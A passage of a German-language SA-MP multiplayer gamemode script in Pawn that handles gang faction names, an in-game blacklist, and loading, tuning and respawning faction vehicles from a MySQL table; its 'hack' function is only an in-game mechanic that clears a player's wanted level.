	else if(Faction == 14) format(FactionName,sizeof(FactionName),"Ballas");
	else if(Faction == 16) format(FactionName,sizeof(FactionName),"LS Vagos");
	else if(Faction == 17) format(FactionName,sizeof(FactionName),"Aztecas");
	else if(Faction == 18) format(FactionName,sizeof(FactionName),"SF Rifa");
	else if(Faction == 19) format(FactionName,sizeof(FactionName),"Red Soldiers");
	else if(Faction == 23) format(FactionName,sizeof(FactionName),"Russen Mafia");
	else format(FactionName,sizeof(FactionName),"NoN-Gang");
	return FactionName;
}
stock GetPlayerFaction(playerid){
	new Member = GetPlayerMember(playerid);
	if(Member)
	    return Member;
	new Leader = GetPlayerLeader(playerid);
	if(Leader)
	    return Leader;
	return 1;
}

//-----------------------------Funktion für GetPlayerMafia für die Blacklist ---------------------------------
Function GetPlayerMafia(playerid)
{
    new mafianumber;
    if(PlayerInfo[playerid][pMember]==5||PlayerInfo[playerid][pLeader]==5)
    {
        mafianumber = 1;
        return mafianumber;
    }
    if(PlayerInfo[playerid][pMember]==6||PlayerInfo[playerid][pLeader]==6)
    {
        mafianumber = 2;
        return mafianumber;
    }
    if(PlayerInfo[playerid][pMember]==12||PlayerInfo[playerid][pLeader]==12)
    {
        mafianumber = 3;
        return mafianumber;
    }
    if(PlayerInfo[playerid][pMember]==13||PlayerInfo[playerid][pLeader]==13)
    {
        mafianumber = 4;
        return mafianumber;
    }
    if(PlayerInfo[playerid][pMember]==14||PlayerInfo[playerid][pLeader]==14)
    {
        mafianumber = 5;
        return mafianumber;
    }
    if(PlayerInfo[playerid][pMember]==15||PlayerInfo[playerid][pLeader]==15)
    {
        mafianumber = 6;
        return mafianumber;
    }
    if(PlayerInfo[playerid][pMember]==16||PlayerInfo[playerid][pLeader]==16)
    {
        mafianumber = 7;
        return mafianumber;
    }
    if(PlayerInfo[playerid][pMember]==17||PlayerInfo[playerid][pLeader]==17)
    {
        mafianumber = 8;
        return mafianumber;
    }
    if(PlayerInfo[playerid][pMember]==18||PlayerInfo[playerid][pLeader]==18)
    {
        mafianumber = 9;
        return mafianumber;
    }
    if(PlayerInfo[playerid][pMember]==19||PlayerInfo[playerid][pLeader]==19)
    {
        mafianumber = 10;
        return mafianumber;
    }
    if(PlayerInfo[playerid][pMember]==23||PlayerInfo[playerid][pLeader]==23)
    {
        mafianumber = 11;
        return mafianumber;
	}
    return 0;
}

Function  LoadBlacklist()
{
    new idx = 1;
    while(idx < sizeof(Blacklist))
    {
        new noone[256] = "Niemand";
        strmid(Blacklist[idx][user1],noone,0,strlen(noone),255);
        strmid(Blacklist[idx][user2],noone,0,strlen(noone),255);
        strmid(Blacklist[idx][user3],noone,0,strlen(noone),255);
        strmid(Blacklist[idx][user4],noone,0,strlen(noone),255);
        strmid(Blacklist[idx][user5],noone,0,strlen(noone),255);
        strmid(Blacklist[idx][user6],noone,0,strlen(noone),255);
        strmid(Blacklist[idx][user7],noone,0,strlen(noone),255);
        strmid(Blacklist[idx][user8],noone,0,strlen(noone),255);
        strmid(Blacklist[idx][user9],noone,0,strlen(noone),255);
        strmid(Blacklist[idx][user10],noone,0,strlen(noone),255);
        idx++;
    }
}

Function  ClearBlack(playerid)
{
    new killstr[256];



    new noone[256] = "Niemand";
    new plName[256];
    GetPlayerName(playerid,plName,sizeof(plName));
    format(killstr,sizeof(killstr),"Blacklist-Opfer %s wurde getötet!",plName);
    SendFamilyMessage(5, COLOR_YELLOW, killstr);
    SendFamilyMessage(6, COLOR_YELLOW, killstr);
    SendFamilyMessage(14, COLOR_YELLOW, killstr);
    new idx = 1;
    while(idx < sizeof(Blacklist))
    {
	    if(strcmp(Blacklist[idx][user1],plName,true)==0)
        {
    	    strmid(Blacklist[idx][user1],noone,0,strlen(noone),255);
            IsBlacklist[playerid]=0;
        }
        if(strcmp(Blacklist[idx][user2],plName,true)==0)
        {
             strmid(Blacklist[idx][user2],noone,0,strlen(noone),255);
             IsBlacklist[playerid]=0;
        }
        if(strcmp(Blacklist[idx][user3],plName,true)==0)
        {
             strmid(Blacklist[idx][user3],noone,0,strlen(noone),255);
             IsBlacklist[playerid]=0;
        }
        if(strcmp(Blacklist[idx][user4],plName,true)==0)
        {
             strmid(Blacklist[idx][user4],noone,0,strlen(noone),255);
             IsBlacklist[playerid]=0;
        }
        if(strcmp(Blacklist[idx][user5],plName,true)==0)
        {
             strmid(Blacklist[idx][user5],noone,0,strlen(noone),255);
             IsBlacklist[playerid]=0;
        }
        if(strcmp(Blacklist[idx][user6],plName,true)==0)
        {
             strmid(Blacklist[idx][user6],noone,0,strlen(noone),255);
             IsBlacklist[playerid]=0;
        }
        if(strcmp(Blacklist[idx][user7],plName,true)==0)
        {
             strmid(Blacklist[idx][user7],noone,0,strlen(noone),255);
             IsBlacklist[playerid]=0;
        }
        if(strcmp(Blacklist[idx][user8],plName,true)==0)
        {
             strmid(Blacklist[idx][user8],noone,0,strlen(noone),255);
             IsBlacklist[playerid]=0;
        }
        if(strcmp(Blacklist[idx][user9],plName,true)==0)
        {
                 strmid(Blacklist[idx][user9],noone,0,strlen(noone),255);
                 IsBlacklist[playerid]=0;
        }
        if(strcmp(Blacklist[idx][user10],plName,true)==0)
        {
             strmid(Blacklist[idx][user10],noone,0,strlen(noone),255);
             IsBlacklist[playerid]=0;
        }
        idx++;
    }
    return 1;
}
forward hack(playerid);
public hack(playerid)
{
	SendClientMessage(playerid, COLOR_GREY, "Du hast erfolgreich den Polizei Computer gehackt und deine Wanteds gecleart.");
	TogglePlayerControllable(playerid,1);
	WantedLevel[playerid] = 0;
}



//=====================================================================================================









forward START_FRAC();
public START_FRAC(){
	//LoadFactionCars();
//	#if defined FACTION_CARS_LOCKABLE
//	FactionCarsTimer = SetTimer("LockFactionCarDoors",1037,true);
//	#endif




//	SaveFactionCarsTimer = SetTimerEx("SaveFactionCars",((1000*60)*15),true,"d",false);  // wasn dat
	new query[128];
    format(query,sizeof(query),"SELECT * FROM `FraktionsVehikels`");
	mysql_pquery(mysqlcon, query, "LoadFactionCars", "");
	return 1;
}
forward STOP_FRAC();
public STOP_FRAC()
{
	KillTimer(SaveFactionCarsTimer);
//	SaveFactionCars(true);
/*
	#if defined FACTION_CARS_LOCKABLE
	KillTimer(FactionCarsTimer);
	#endif
*/
	return 1;
}
forward FRAC_OnVehicleDeath(vehicleid, killerid);
public FRAC_OnVehicleDeath(vehicleid, killerid)
{
    for(new fc;fc<sizeof(FactionCars);fc++)
	{
	    if(FactionCars[fc][fVehid] >= 400 && FactionCars[fc][fVehid] <= 611)
		{
	    	if(FactionCars[fc][fCarid] == vehicleid)
			{
	        	SetTimerEx("DestroyAndCreateFactionCar",8000,0,"d",fc);
	        	break;
	    	}
		}
	}
	return 1;
}
/*
dcmd_efa(playerid,params[]){
	        if(PlayerInfo[playerid][pAdmin] == 2002)
			{
		new vehid,col1,col2,faction[5];
	    if(!sscanf(params,"dddd",vehid,col1,col2,faction[0])){
			sscanf(params,"dddddddd",vehid,col1,col2,faction[0],faction[1],faction[2],faction[3],faction[4]);
			if(vehid < 400 || vehid > 611) return SendClientMessage(playerid,FACTION_COL_GREY,"Vehicle-ID nur von 400 bis 611.");
			if(col1 < 0 || col1 > 255) return SendClientMessage(playerid,FACTION_COL_GREY,"Falsche Farbe(1)!");
			if(col2 < 0 || col2 > 255) return SendClientMessage(playerid,FACTION_COL_GREY,"Falsche Farbe(2)!");
			if(faction[0] && faction[0] <= MAX_FACTIONS){
			    for(new f;f<5;f++){
			        if(faction[f] <= 0 || faction[f] > MAX_FACTIONS){
			            faction[f] = -255;
					}
				}
				for(new fc;fc<sizeof(FactionCars);fc++){
				    if(FactionCars[fc][fVehid] < 400 || FactionCars[fc][fVehid] > 611){
				        FactionCars[fc][fVehid] = vehid;
	            		new Float:fX,Float:fY,Float:fZ,Float:fA;
	            		GetPlayerPos(playerid,fX,fY,fZ),GetPlayerFacingAngle(playerid,fA);
	           	 		FactionCars[fc][fPos][0] = fX;
	            		FactionCars[fc][fPos][1] = fY;
	            		FactionCars[fc][fPos][2] = fZ;
	            		FactionCars[fc][fPos][3] = fA;
	            		FactionCars[fc][fCol][0] = col1;
            			FactionCars[fc][fCol][1] = col2;

            			FactionCars[fc][fTuning][16] = 100;
	            		for(new f;f<5;f++){
	                		FactionCars[fc][fFaction][f] = faction[f];
	            		}
	            		FactionCars[fc][fPrice] = 0;
	            		for(new mood;mood<16;mood++)
							FactionCars[fc][fTuning][mood] = 0;
                		FactionCars[fc][fCarid] = CreateVehicle(FactionCars[fc][fVehid],FactionCars[fc][fPos][0],FactionCars[fc][fPos][1],FactionCars[fc][fPos][2],FactionCars[fc][fPos][3],FactionCars[fc][fCol][0],FactionCars[fc][fCol][1],-1, 0);

						Gas[FactionCars[fc][fCarid]] = 80;
						SendClientMessage(playerid,COLOR_LIGHTBLUE,"Du hast das Fraktionsfahrzeug erfolgreich erstellt.");
						SendClientMessage(playerid,COLOR_LIGHTBLUE,"Vergesse es nicht mit '/parken' umzuparken.");
						PutPlayerInVehicle(playerid,FactionCars[fc][fCarid],0);
				        return true;
				    }
				}SendClientMessage(playerid,FACTION_COL_GREY,"Die Maximale Anzahl von Fraktionsfahrzeugen wurde bereits erreicht.");
			}else SendClientMessage(playerid,FACTION_COL_GREY,"Falsche Fraktion!");
	    }else SendClientMessage(playerid,FACTION_COL_GREY,"Benutze: '/efa [Model] [Farbe(1)] [Farbe(2)] [Hauptfraktion]'.");
	}else SendClientMessage(playerid,FACTION_COL_GREY,"Du bist nicht berechtigt diesen Befehl anzuwenden.");
	return true;
}

                        #if defined FACTION_CARS_LOCKABLE
                        FactionCars[fc][fLock] = true;
                        #endif
*/
forward FRAC_OnVehicleMod(playerid, vehicleid, componentid);
public FRAC_OnVehicleMod(playerid, vehicleid, componentid)
{
    for(new fc;fc<sizeof(FactionCars);fc++)
	{
	    if(FactionCars[fc][fVehid] >= 400 && FactionCars[fc][fVehid] <= 611)
		{
	        if(FactionCars[fc][fCarid] == vehicleid)
			{
				if(PlayerInfo[playerid][sMember] == FactionCars[fc][fFaction])
				{
					if((componentid >= 1008) && (componentid <= 1010)) {FactionCars[fc][fTuning][1] = componentid;}//NOS
					if((componentid >= 1142) && (componentid <= 1145)) {FactionCars[fc][fTuning][2] = componentid;}//VENTS
					if((componentid == 1013) || (componentid == 1024)) {FactionCars[fc][fTuning][3] = componentid;}//LAMPS
					if((componentid >= 1004) && (componentid <= 1005)||(componentid >= 1011) && (componentid <= 1012)) { FactionCars[fc][fTuning][4] = componentid; }// HOD
					if(componentid == 1087) {FactionCars[fc][fTuning][5] = componentid;}//HYD
					if(componentid == 1086) {FactionCars[fc][fTuning][5] = componentid;}// HYD
					if(IsAWheel(componentid)) {FactionCars[fc][fTuning][6] = componentid;}//WHEEL
					if(IsAExhaust(componentid)) {FactionCars[fc][fTuning][7] = componentid;}//AUSPUFF
					if(IsASideL(componentid)) {FactionCars[fc][fTuning][8] = componentid; FactionCars[fc][fTuning][9] = SideR;}//SIDEr
					if(IsASideR(componentid)) {FactionCars[fc][fTuning][9] = componentid; FactionCars[fc][fTuning][8] = SideL;}//SIDEL
					if(IsAFB(componentid)) {FactionCars[fc][fTuning][10] = componentid;}//FB
					if(IsARB(componentid)) {FactionCars[fc][fTuning][11] = componentid;}//RB
					if(IsASpoiler(componentid)) {FactionCars[fc][fTuning][12] = componentid;}//SPOILER
					if(IsARoof(componentid)) {FactionCars[fc][fTuning][13] = componentid;}//ROOF
				}
				else
				{
				    SetTimerEx("RemoveComponent",3000,false,"dd",vehicleid,componentid);
				}
				break;
			}
	    }
	}return 1;
}
forward FRAC_OnVehiclePaintjob(playerid, vehicleid, paintjobid);
public FRAC_OnVehiclePaintjob(playerid, vehicleid, paintjobid){
    for(new fc;fc<sizeof(FactionCars);fc++){
	    if(FactionCars[fc][fVehid] >= 400 && FactionCars[fc][fVehid] <= 611){
	        if(FactionCars[fc][fCarid] == vehicleid){
	            SetTimerEx("ChangePaintjob",3000,false,"dd",FactionCars[fc][fCarid],3);
	            break;
	        }
	    }
	}return 1;
}
forward FRAC_OnVehicleRespray(playerid, vehicleid, color1, color2);
public FRAC_OnVehicleRespray(playerid, vehicleid, color1, color2){
    for(new fc;fc<sizeof(FactionCars);fc++){
		if(FactionCars[fc][fVehid] >= 400 && FactionCars[fc][fVehid] <= 611){
		    if(FactionCars[fc][fCarid] == vehicleid){
		        SetTimerEx("ChangeColor",3000,false,"ddd",FactionCars[fc][fCarid],FactionCars[fc][fCol][0],FactionCars[fc][fCol][1]);
				break;
			}
		}
	}return 1;
}
/*
#if defined FACTION_CARS_LOCKABLE
public LockFactionCarDoors(){
    ForAllPlayers(i){
    	for(new fc;fc<sizeof(FactionCars);fc++){
			if(FactionCars[fc][fVehid] >= 400 && FactionCars[fc][fVehid] <= 611){
		    	if(FactionCars[fc][fLock] == true){
       				if(GetPlayerFaction(i)==FactionCars[fc][fFaction][0]||GetPlayerFaction(i)==FactionCars[fc][fFaction][1]||GetPlayerFaction(i)==FactionCars[fc][fFaction][2]||GetPlayerFaction(i)==FactionCars[fc][fFaction][3]||GetPlayerFaction(i)==FactionCars[fc][fFaction][4]||GetPlayerAdmin(i) >= NEEDED_ADMINLEVEL)
					    SetVehicleParamsForPlayer(FactionCars[fc][fCarid],i,false,false);
					else
					   SetVehicleParamsForPlayer(FactionCars[fc][fCarid],i,false,true);
				}
			}
	    }
	}return true;
}
stock fLockCar(vehicleid){
	ForAllPlayers(i)
	    SetVehicleParamsForPlayer(vehicleid,i,false,true);
	return true;
}
stock fUnlockCar(vehicleid){
	ForAllPlayers(i)
	    SetVehicleParamsForPlayer(vehicleid,i,false,false);
	return true;
}
#endif
*/



forward DestroyAndCreateCar(playerid,x);
public DestroyAndCreateCar(playerid,x)
{
	if(PlayerCar[playerid][x][IsWohnwagen] == 1)
	{//3168
		DestroyObject(Wohnwagen[PlayerCar[playerid][x][CarId]]);
	}
	if(PlayerCar[playerid][x][Neon] >= 1)
	{
		DestroyObject(Neonrohr[PlayerCar[playerid][x][CarId]][Neon]);
		DestroyObject(Neonrohr[PlayerCar[playerid][x][CarId]][Neon1]);
	}
	DestroyVehicle(PlayerCar[playerid][x][CarId]);
	PlayerCarSpawn(playerid,x);
	return 1;
}

public DestroyAndCreateFactionCar(fc)
{
	if(FactionCars[fc][fVehid] >= 400 && FactionCars[fc][fVehid] <= 611)
	{
		if(FactionCars[fc][fTuning][14] != 0)
		{
			if(FactionCars[fc][fVehid] == 560)
			{
				DestroyDynamicObject(SireneFrak[FactionCars[fc][fCarid]]);
			}
		}
    	DestroyVehicle(FactionCars[fc][fCarid]);
    	FactionCars[fc][fCarid] = CreateVehicle(FactionCars[fc][fVehid],FactionCars[fc][fPos][0],FactionCars[fc][fPos][1],FactionCars[fc][fPos][2],FactionCars[fc][fPos][3],FactionCars[fc][fCol][0],FactionCars[fc][fCol][1],-1,FactionCars[fc][UCLSirene]);


			SetTimerEx("fCarTuning",700,0,"i",fc);


//		    if(FactionCars[fc][fTuning][0] != 0) { AddVehicleComponent(FactionCars[fc][fCarid],FactionCars[fc][fTuning][0]); }
		    if(FactionCars[fc][fTuning][1] != 0) { AddVehicleComponent(FactionCars[fc][fCarid],FactionCars[fc][fTuning][1]); }
		    if(FactionCars[fc][fTuning][2] != 0) { AddVehicleComponent(FactionCars[fc][fCarid],FactionCars[fc][fTuning][2]); }
		    if(FactionCars[fc][fTuning][3] != 0) { AddVehicleComponent(FactionCars[fc][fCarid],FactionCars[fc][fTuning][3]); }
		    if(FactionCars[fc][fTuning][4] != 0) { AddVehicleComponent(FactionCars[fc][fCarid],FactionCars[fc][fTuning][4]); }
		    if(FactionCars[fc][fTuning][5] != 0) { AddVehicleComponent(FactionCars[fc][fCarid],FactionCars[fc][fTuning][5]); }
		    if(FactionCars[fc][fTuning][6] != 0) { AddVehicleComponent(FactionCars[fc][fCarid],FactionCars[fc][fTuning][6]); }
		    if(FactionCars[fc][fTuning][7] != 0) { AddVehicleComponent(FactionCars[fc][fCarid],FactionCars[fc][fTuning][7]); }
		    if(FactionCars[fc][fTuning][8] != 0) { AddVehicleComponent(FactionCars[fc][fCarid],FactionCars[fc][fTuning][8]); }
		    if(FactionCars[fc][fTuning][9] != 0) { AddVehicleComponent(FactionCars[fc][fCarid],FactionCars[fc][fTuning][9]); }
		    if(FactionCars[fc][fTuning][10] != 0) { AddVehicleComponent(FactionCars[fc][fCarid],FactionCars[fc][fTuning][10]); }
		    if(FactionCars[fc][fTuning][11] != 0) { AddVehicleComponent(FactionCars[fc][fCarid],FactionCars[fc][fTuning][11]); }
		    if(FactionCars[fc][fTuning][12] != 0) { AddVehicleComponent(FactionCars[fc][fCarid],FactionCars[fc][fTuning][12]); }
		    if(FactionCars[fc][fTuning][13] != 0){AddVehicleComponent(FactionCars[fc][fCarid],FactionCars[fc][fTuning][13]);}

            //------------------------------------------------------
			if(FactionCars[fc][fFaction] == 1)
			{
				SetVehicleNumberPlate(FactionCars[fc][fCarid], "LSPD");
			}
			else if(FactionCars[fc][fFaction] == 2)
			{
				SetVehicleNumberPlate(FactionCars[fc][fCarid], "F.B.I");
			}
			else if(FactionCars[fc][fFaction] == 3)
			{
				SetVehicleNumberPlate(FactionCars[fc][fCarid], "Bundeswehr");
			}
			else if(FactionCars[fc][fFaction] == 4)
			{
				SetVehicleNumberPlate(FactionCars[fc][fCarid], "Sanitäter");
			}
			else if(FactionCars[fc][fFaction] == 5)
			{
				SetVehicleNumberPlate(FactionCars[fc][fCarid], "Los Chicken Malos");
			}
			else if(FactionCars[fc][fFaction] == 6)
			{
				SetVehicleNumberPlate(FactionCars[fc][fCarid], "Yakuza");
			}
			else if(FactionCars[fc][fFaction] == 7)
			{
				SetVehicleNumberPlate(FactionCars[fc][fCarid], "Regierung");
			}
			else if(FactionCars[fc][fFaction] == 8)
			{
				SetVehicleNumberPlate(FactionCars[fc][fCarid], "Hitman");
			}
			else if(FactionCars[fc][fFaction] == 9)
			{
				SetVehicleNumberPlate(FactionCars[fc][fCarid], "San News");
			}
			else if(FactionCars[fc][fFaction] == 10)
			{
				SetVehicleNumberPlate(FactionCars[fc][fCarid], "Transport GmbH");
			}
			else if(FactionCars[fc][fFaction] == 11)
			{
				SetVehicleNumberPlate(FactionCars[fc][fCarid], "Fahrlehrer");
			}
			else if(FactionCars[fc][fFaction] == 12)
			{
				SetVehicleNumberPlate(FactionCars[fc][fCarid], "Triaden");
			}
			else if(FactionCars[fc][fFaction] == 13)
			{
				SetVehicleNumberPlate(FactionCars[fc][fCarid], "Grove Street");
			}
			else if(FactionCars[fc][fFaction] == 14)
			{
				SetVehicleNumberPlate(FactionCars[fc][fCarid], "Ballas");
			}
			else if(FactionCars[fc][fFaction] == 15)
			{
				SetVehicleNumberPlate(FactionCars[fc][fCarid], "SA Feuerwehr");
			}
			else if(FactionCars[fc][fFaction] == 16)
			{
				SetVehicleNumberPlate(FactionCars[fc][fCarid], "LS Vagos");
			}
			else if(FactionCars[fc][fFaction] == 17)
			{
				SetVehicleNumberPlate(FactionCars[fc][fCarid], "Aztecas");
			}
			else if(FactionCars[fc][fFaction] == 18)
			{
				SetVehicleNumberPlate(FactionCars[fc][fCarid], "SF Rifa");
			}
			else if(FactionCars[fc][fFaction] == 19)
			{
				SetVehicleNumberPlate(FactionCars[fc][fCarid], "Red Soldiers");
			}
			else if(FactionCars[fc][fFaction] == 20)
			{
				SetVehicleNumberPlate(FactionCars[fc][fCarid], "Terroristen");
			}
			else if(FactionCars[fc][fFaction] == 21)
			{
				SetVehicleNumberPlate(FactionCars[fc][fCarid], "Wheelman");
			}
			else if(FactionCars[fc][fFaction] == 22)
			{
				SetVehicleNumberPlate(FactionCars[fc][fCarid], "S.W.A.T");
			}
			else if(FactionCars[fc][fFaction] == 23)
			{
				SetVehicleNumberPlate(FactionCars[fc][fCarid], "Russen Mafia");
			}
			else if(FactionCars[fc][fFaction] == 24)
			{
				SetVehicleNumberPlate(FactionCars[fc][fCarid], "Ordnungsamt");
			}
			SetVehicleToRespawn(FactionCars[fc][fCarid]);

			    if(FactionCars[fc][fTuning][14] != 0)
				{
				    if(FactionCars[fc][fVehid] == 560)
					{
						SireneFrak[FactionCars[fc][fCarid]] = CreateDynamicObject(19419,0,0,-1000,0,0,0,100);
						AttachDynamicObjectToVehicle(SireneFrak[FactionCars[fc][fCarid]], FactionCars[fc][fCarid], 0.000000,-0.150000,0.824999, 0.0, 0.0, 0.0);
					}
				}
	}
	return 1;
}
public LoadFactionCars(){
	/*if(!fexist(FACTION_CAR_FILE)){
    	new File:tfFile=fopen(FACTION_CAR_FILE,io_write);
		fclose(tfFile);
	}
	new File:fFile=fopen(FACTION_CAR_FILE,io_read),Content[1024],fc;
 	while(fread(fFile,Content) && fc<sizeof(FactionCars)){
    	StripNewLine(Content);
        sscanf(Content,"dffffdddddddddddddddddddddddddd",*/


  //	new fc = getFreeFrakCarID();

 	new rows,fc;//,fc;//, /*temp[128],*/// fc = getFreeFrakCarID();
    cache_get_row_count(rows);
	if(rows)
	{
	    for(new i; i<rows; i++)
    	{
    	//new fc = getFreeFrakCarID();
       	//cache_get_value_name_int(i, "factioncardbid", fc);
        fc = i;
     	cache_get_value_name_int(i, "factioncardbid", FactionCars[fc][factioncardbid]);
     	cache_get_value_name_int(i, "fVehid", FactionCars[fc][fVehid]);
     	cache_get_value_name_int(i, "fCol", FactionCars[fc][fCol][0]);
        cache_get_value_name_int(i, "fCol2", FactionCars[fc][fCol][1]);
        cache_get_value_name_int(i, "fFaction", FactionCars[fc][fFaction]);
        cache_get_value_name_int(i, "fPrice", FactionCars[fc][fPrice]);

     	cache_get_value_name_float(i, "fPosx", FactionCars[fc][fPos][0]);
     	cache_get_value_name_float(i, "fPosy", FactionCars[fc][fPos][1]);
     	cache_get_value_name_float(i, "fPosz", FactionCars[fc][fPos][2]);
     	cache_get_value_name_float(i, "fPosr", FactionCars[fc][fPos][3]);


     	cache_get_value_name_int(i, "UCLSirene", FactionCars[fc][UCLSirene]);
     	cache_get_value_name_int(i, "fTuning0", FactionCars[fc][fTuning][0]);
     	cache_get_value_name_int(i, "fTuning1", FactionCars[fc][fTuning][1]);
     	cache_get_value_name_int(i, "fTuning2", FactionCars[fc][fTuning][2]);
     	cache_get_value_name_int(i, "fTuning3", FactionCars[fc][fTuning][3]);
     	cache_get_value_name_int(i, "fTuning4", FactionCars[fc][fTuning][4]);
     	cache_get_value_name_int(i, "fTuning5", FactionCars[fc][fTuning][5]);
     	cache_get_value_name_int(i, "fTuning6", FactionCars[fc][fTuning][6]);
     	cache_get_value_name_int(i, "fTuning7", FactionCars[fc][fTuning][7]);
     	cache_get_value_name_int(i, "fTuning8", FactionCars[fc][fTuning][8]);
     	cache_get_value_name_int(i, "fTuning9", FactionCars[fc][fTuning][9]);
     	cache_get_value_name_int(i, "fTuning10", FactionCars[fc][fTuning][10]);
     	cache_get_value_name_int(i, "fTuning11", FactionCars[fc][fTuning][11]);
     	cache_get_value_name_int(i, "fTuning12", FactionCars[fc][fTuning][12]);
     	cache_get_value_name_int(i, "fTuning13", FactionCars[fc][fTuning][13]);
     	cache_get_value_name_int(i, "fTuning14", FactionCars[fc][fTuning][14]);
     	cache_get_value_name_int(i, "fTuning15", FactionCars[fc][fTuning][15]);
     	cache_get_value_name_int(i, "fTuning16", FactionCars[fc][fTuning][16]);
     	cache_get_value_name_int(i, "fTuning17", FactionCars[fc][fTuning][17]);



		FactionCars[fc][fCarid] = CreateVehicle(FactionCars[fc][fVehid],FactionCars[fc][fPos][0],FactionCars[fc][fPos][1],FactionCars[fc][fPos][2],FactionCars[fc][fPos][3],FactionCars[fc][fCol][0],FactionCars[fc][fCol][1],-1,FactionCars[fc][UCLSirene]);



        /*
		FactionCars[fc][fVehid],
		FactionCars[fc][fPos][0],
		FactionCars[fc][fPos][1],
		FactionCars[fc][fPos][2],
		FactionCars[fc][fPos][3],
		FactionCars[fc][fCol][0],
		FactionCars[fc][fCol][1],
		FactionCars[fc][fFaction][0],
		FactionCars[fc][fFaction][1],
		FactionCars[fc][fFaction][2],
		FactionCars[fc][fFaction][3],
		FactionCars[fc][fFaction][4],
		FactionCars[fc][fTuning][0],
		FactionCars[fc][fTuning][1],
		FactionCars[fc][fTuning][2],
		FactionCars[fc][fTuning][3],
		FactionCars[fc][fTuning][4],
		FactionCars[fc][fTuning][5],
		FactionCars[fc][fTuning][6],
		FactionCars[fc][fTuning][7],
		FactionCars[fc][fTuning][8],
		FactionCars[fc][fTuning][9],
		FactionCars[fc][fTuning][10],
		FactionCars[fc][fTuning][11],
		FactionCars[fc][fTuning][12],
		FactionCars[fc][fTuning][13],
		FactionCars[fc][fTuning][14],
		FactionCars[fc][fTuning][15],// Kilometer
		FactionCars[fc][fTuning][16],// Benzin
		FactionCars[fc][fTuning][17],// Abgeschleppt
		FactionCars[fc][fPrice]);*/


        if(FactionCars[fc][fVehid] >= 400 && FactionCars[fc][fVehid] <= 611)
		{

/*
			#if defined FACTION_CARS_LOCKABLE
			fLockCar(FactionCars[fc][fCarid]);
			FactionCars[fc][fLock] = true;
			#endif
*/

				SetTimerEx("fCarTuning",700,0,"i",fc);
//			    if(FactionCars[fc][fTuning][0] != 0) { AddVehicleComponent(FactionCars[fc][fCarid],FactionCars[fc][fTuning][0]); }
			    if(FactionCars[fc][fTuning][1] != 0) { AddVehicleComponent(FactionCars[fc][fCarid],FactionCars[fc][fTuning][1]); }
			    if(FactionCars[fc][fTuning][2] != 0) { AddVehicleComponent(FactionCars[fc][fCarid],FactionCars[fc][fTuning][2]); }
			    if(FactionCars[fc][fTuning][3] != 0) { AddVehicleComponent(FactionCars[fc][fCarid],FactionCars[fc][fTuning][3]); }
			    if(FactionCars[fc][fTuning][4] != 0) { AddVehicleComponent(FactionCars[fc][fCarid],FactionCars[fc][fTuning][4]); }
			    if(FactionCars[fc][fTuning][5] != 0) { AddVehicleComponent(FactionCars[fc][fCarid],FactionCars[fc][fTuning][5]); }
			    if(FactionCars[fc][fTuning][6] != 0) { AddVehicleComponent(FactionCars[fc][fCarid],FactionCars[fc][fTuning][6]); }
			    if(FactionCars[fc][fTuning][7] != 0) { AddVehicleComponent(FactionCars[fc][fCarid],FactionCars[fc][fTuning][7]); }
			    if(FactionCars[fc][fTuning][8] != 0) { AddVehicleComponent(FactionCars[fc][fCarid],FactionCars[fc][fTuning][8]); }
			    if(FactionCars[fc][fTuning][9] != 0) { AddVehicleComponent(FactionCars[fc][fCarid],FactionCars[fc][fTuning][9]); }
			    if(FactionCars[fc][fTuning][10] != 0) { AddVehicleComponent(FactionCars[fc][fCarid],FactionCars[fc][fTuning][10]); }
			    if(FactionCars[fc][fTuning][11] != 0) { AddVehicleComponent(FactionCars[fc][fCarid],FactionCars[fc][fTuning][11]); }
			    if(FactionCars[fc][fTuning][12] != 0) { AddVehicleComponent(FactionCars[fc][fCarid],FactionCars[fc][fTuning][12]); }
			    if(FactionCars[fc][fTuning][13] != 0){AddVehicleComponent(FactionCars[fc][fCarid],FactionCars[fc][fTuning][13]);}

                //----------------------------------------
				if(FactionCars[fc][fFaction] == 1)
				{
					SetVehicleNumberPlate(FactionCars[fc][fCarid], "LSPD");
				}
				else if(FactionCars[fc][fFaction] == 2)
				{
					SetVehicleNumberPlate(FactionCars[fc][fCarid], "F.B.I");
				}
				else if(FactionCars[fc][fFaction] == 3)
				{
					SetVehicleNumberPlate(FactionCars[fc][fCarid], "Bundeswehr");
				}
				else if(FactionCars[fc][fFaction] == 4)
				{
					SetVehicleNumberPlate(FactionCars[fc][fCarid], "Sanitäter");
				}
				else if(FactionCars[fc][fFaction] == 5)
				{
					SetVehicleNumberPlate(FactionCars[fc][fCarid], "Los Chicken Malos");
				}
				else if(FactionCars[fc][fFaction] == 6)
				{
					SetVehicleNumberPlate(FactionCars[fc][fCarid], "Yakuza");
				}
				else if(FactionCars[fc][fFaction] == 7)
				{
					SetVehicleNumberPlate(FactionCars[fc][fCarid], "Regierung");
				}
				else if(FactionCars[fc][fFaction] == 8)
				{
					SetVehicleNumberPlate(FactionCars[fc][fCarid], "Hitman");
				}
				else if(FactionCars[fc][fFaction] == 9)
				{
					SetVehicleNumberPlate(FactionCars[fc][fCarid], "San News");
				}
				else if(FactionCars[fc][fFaction] == 10)
				{
					SetVehicleNumberPlate(FactionCars[fc][fCarid], "Transport GmbH");
				}
				else if(FactionCars[fc][fFaction] == 11)
				{
					SetVehicleNumberPlate(FactionCars[fc][fCarid], "Fahrlehrer");
				}
				else if(FactionCars[fc][fFaction] == 12)
				{
					SetVehicleNumberPlate(FactionCars[fc][fCarid], "Triaden");
				}
				else if(FactionCars[fc][fFaction] == 13)
				{
					SetVehicleNumberPlate(FactionCars[fc][fCarid], "Grove Street");
				}
				else if(FactionCars[fc][fFaction] == 14)
				{
					SetVehicleNumberPlate(FactionCars[fc][fCarid], "Ballas");
				}
				else if(FactionCars[fc][fFaction] == 15)
				{
					SetVehicleNumberPlate(FactionCars[fc][fCarid], "Keine Ahnung");
				}
				else if(FactionCars[fc][fFaction] == 16)
				{
					SetVehicleNumberPlate(FactionCars[fc][fCarid], "LS Vagos");
				}
				else if(FactionCars[fc][fFaction] == 17)
				{
					SetVehicleNumberPlate(FactionCars[fc][fCarid], "Aztecas");
				}
				else if(FactionCars[fc][fFaction] == 18)
				{
					SetVehicleNumberPlate(FactionCars[fc][fCarid], "SF Rifa");
				}
				else if(FactionCars[fc][fFaction] == 19)
				{
					SetVehicleNumberPlate(FactionCars[fc][fCarid], "Red Soldiers");
				}
				else if(FactionCars[fc][fFaction] == 20)
				{
					SetVehicleNumberPlate(FactionCars[fc][fCarid], "Terroristen");
				}
				else if(FactionCars[fc][fFaction] == 21)
				{
